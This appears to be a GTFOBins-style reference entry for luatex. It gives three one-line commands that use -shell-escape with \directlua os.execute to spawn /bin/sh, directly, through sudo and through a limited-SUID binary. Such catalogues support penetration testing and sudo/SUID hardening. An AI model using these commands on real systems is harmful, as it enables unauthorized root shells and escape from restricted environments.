---
description: This allows to execute [`lua`](../lua/index.html) code.
functions:
  shell:
    - code: luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
  sudo:
    - code: sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
  limited-suid:
    - code: ./luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
---
